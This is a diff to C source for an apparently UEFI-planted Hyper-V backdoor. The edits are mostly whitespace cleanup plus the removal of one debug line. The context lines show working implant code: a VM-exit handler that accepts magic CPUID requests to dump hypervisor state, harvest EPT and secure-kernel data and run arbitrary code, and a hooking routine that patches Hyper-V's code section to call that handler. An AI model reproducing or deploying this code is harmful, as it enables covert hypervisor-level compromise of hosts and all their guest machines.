@@ -89,7 +89,7 @@ VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
 {
     // 2-nd argument is pointer to the backdoor section
     PHVBD_DATA BackdoorData = (PHVBD_DATA)((UINT8 *)arg_2 + HVBD_DATA_ADDR);
-    
+
     UINT64 ExitReason = 0;
     VM_GUEST_STATE *Context = NULL;
 
@@ -109,8 +109,8 @@ VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
 
     // check for request from the client
     if (ExitReason == VM_EXIT_CPUID && Context->R10 == HVBD_VM_EXIT_MAGIC)
-    {        
-        EFI_STATUS Status = EFI_INVALID_PARAMETER;        
+    {
+        EFI_STATUS Status = EFI_INVALID_PARAMETER;
 
         UINT64 Code = Context->R11;
         UINT64 *Arg0 = &Context->R12;
@@ -134,16 +134,16 @@ VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
             __sidt(Arg0);
 
             // return hypervisor GS segment base
-            *Arg2 = __readgsqword(0);        
+            *Arg2 = __readgsqword(0);
 
             Status = EFI_SUCCESS;
         }
         else if (Code == HVBD_C_INFO_EX2)
         {
-            // return VM exit handler information                        
-            *Arg0 = BackdoorData->VmExitHandler; 
-            *Arg1 = BackdoorData->VmExitCount; 
-            *Arg2 = BackdoorData->VmCallCount;  
+            // return VM exit handler information
+            *Arg0 = BackdoorData->VmExitHandler;
+            *Arg1 = BackdoorData->VmExitCount;
+            *Arg2 = BackdoorData->VmCallCount;
 
             Status = EFI_SUCCESS;
         }
@@ -192,7 +192,7 @@ VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
 
             // disable EPT harvesting
             BackdoorData->Flags &= ~HVBD_F_COLLECT_EPT;
-                
+
             Status = EFI_SUCCESS;
         }
         else if (Code == HVBD_C_SK_GET_START)
@@ -214,7 +214,7 @@ VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
 
             // disable EPT harvesting
             BackdoorData->Flags &= ~HVBD_F_COLLECT_SK;
-                
+
             Status = EFI_SUCCESS;
         }
         else if (Code == HVBD_C_INVL_CACHES)
@@ -238,7 +238,7 @@ VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
         }
         else if (Code == HVBD_C_EXECUTE)
         {
-            EXECUTE_FUNC Func = (EXECUTE_FUNC)(*Arg2);            
+            EXECUTE_FUNC Func = (EXECUTE_FUNC)(*Arg2);
 
             // execute arbitrary code
             *Arg2 = 0;
@@ -271,7 +271,7 @@ VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
                 // read VPID from the current VMCS
                 __vmx_vmread(0, &Entry->Vpid);
 
-                break;   
+                break;
             }
             else if (Entry->Addr == EptAddr)
             {
@@ -286,11 +286,11 @@ VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
         ExitReason == VM_EXIT_VMCALL && Context->Rcx == HvCallVtlReturn)
     {
         UINTN i = 0;
-        UINT64 Rip = 0, Cr3 = 0, EptAddr = 0;  
+        UINT64 Rip = 0, Cr3 = 0, EptAddr = 0;
 
         // read VMCS fields
         __vmx_vmread(GUEST_RIP, &Rip);
-        __vmx_vmread(GUEST_CR3, &Cr3);                    
+        __vmx_vmread(GUEST_CR3, &Cr3);
         __vmx_vmread(EPT_POINTER, &EptAddr);
 
         // find secure kernel info list free entry
@@ -307,7 +307,7 @@ VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
                 __vmx_vmread(GUEST_IDTR_BASE, &Entry->IdtAddr);
                 __vmx_vmread(GUEST_GDTR_BASE, &Entry->GdtAddr);
                 
-                break;   
+                break;
             }
             else if (Entry->Rip == Rip && Entry->Cr3 == Cr3 && Entry->EptAddr == EptAddr)
             {
@@ -321,7 +321,7 @@ VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
 
     if (ExitReason == VM_EXIT_VMCALL)
     {
-        BackdoorData->VmCallCount += 1;        
+        BackdoorData->VmCallCount += 1;
     }
 
     BackdoorData->VmExitCount += 1;
@@ -385,9 +385,7 @@ VOID *HyperVHook(VOID *Image)
         Image, ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew);
 
     EFI_IMAGE_SECTION_HEADER *pSection = (EFI_IMAGE_SECTION_HEADER *)RVATOVA(
-        &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);    
-
-    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Hyper-V image is at "FPTR"\r\n", Image);
+        &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);
 
     // find resources section by name
     for (i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1, pSection += 1)
@@ -406,14 +404,14 @@ VOID *HyperVHook(VOID *Image)
             BuffSize = ALIGN_UP(pSection->Misc.VirtualSize, pHeaders->OptionalHeader.SectionAlignment);
 
             DbgMsg(
-                __FILE__, __LINE__, __FUNCTION__"(): Resources section RVA is 0x%x (0x%x bytes)\r\n", 
+                __FILE__, __LINE__, __FUNCTION__"(): Resources section RVA is 0x%x (0x%x bytes)\r\n",
                 pSection->VirtualAddress, BuffSize
-            );            
+            );
 
             if (BuffSize < PAGE_SIZE || (pSection->VirtualAddress & (PAGE_SIZE - 1)) != 0)
             {
                 DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Invalid address/size\r\n");
-                return NULL;   
+                return NULL;
             }
 
             // erase section contents
@@ -446,7 +444,7 @@ VOID *HyperVHook(VOID *Image)
                 __FILE__, __LINE__, __FUNCTION__"(): Code section RVA is 0x%x\r\n", 
                 pSection->VirtualAddress
             );
-            
+
             while (Size < pSection->Misc.VirtualSize - PAGE_SIZE)
             {
                 UINTN Version = 0, HookLen = 0;
@@ -734,12 +732,12 @@ VOID *HyperVHook(VOID *Image)
 
                     // save registers
                     std_memcpy(Buff + Ptr, RegPush, sizeof(RegPush));
-                    Ptr += sizeof(RegPush);                    
+                    Ptr += sizeof(RegPush);
 
                     // call of the backdoor code
                     *(Buff + Ptr) = 0xe8;
                     *(UINT32 *)(Buff + Ptr + 1) = JUMP32_OP(Buff + Ptr, Buff);
-                    Ptr += JUMP32_LEN;                    
+                    Ptr += JUMP32_LEN;
 
                     // restore registers
                     std_memcpy(Buff + Ptr, RegPop, sizeof(RegPop));
@@ -755,7 +753,7 @@ VOID *HyperVHook(VOID *Image)
 
                     // jump to the handler
                     *Func = 0xe9;
-                    *(UINT32 *)(Func + 1) = JUMP32_OP(Func, Buff + CodeLen);                    
+                    *(UINT32 *)(Func + 1) = JUMP32_OP(Func, Buff + CodeLen);
 
                     // initialize backdoor data
                     BackdoorData->Flags = 0;
@@ -772,7 +770,7 @@ VOID *HyperVHook(VOID *Image)
 
             break;
         }
-    }       
+    }
 
     if (Ret == NULL)
     {
